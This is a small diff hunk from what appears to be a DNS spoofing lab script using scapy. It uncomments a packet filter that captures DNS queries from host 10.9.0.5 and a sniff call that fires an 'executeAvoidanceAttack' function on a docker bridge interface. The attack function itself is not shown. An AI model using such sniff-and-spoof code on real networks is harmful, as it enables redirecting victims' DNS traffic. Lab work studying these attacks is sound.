@@ -87,6 +87,6 @@ def executeAvoidanceAttack():
 # fakeDomain = '1.2.3.4'
 
 # # a filter to sniff packets specifically sent by this host towards port 53 - which is the local DNS server
-# packetFilter = 'udp and src host 10.9.0.5 and dst port 53'
+packetFilter = 'udp and src host 10.9.0.5 and dst port 53'
 # # the scapy sniff function; it executes the attack as soon as it sniffs the DNS query packet
-# sniffedPacket = sniff(iface = 'br-68a034f7b70c', filter = packetFilter, prn = executeAvoidanceAttack(target, fakeDomain))
+sniffedPacket = sniff(iface = 'br-68a034f7b70c', filter = packetFilter, prn = executeAvoidanceAttack())
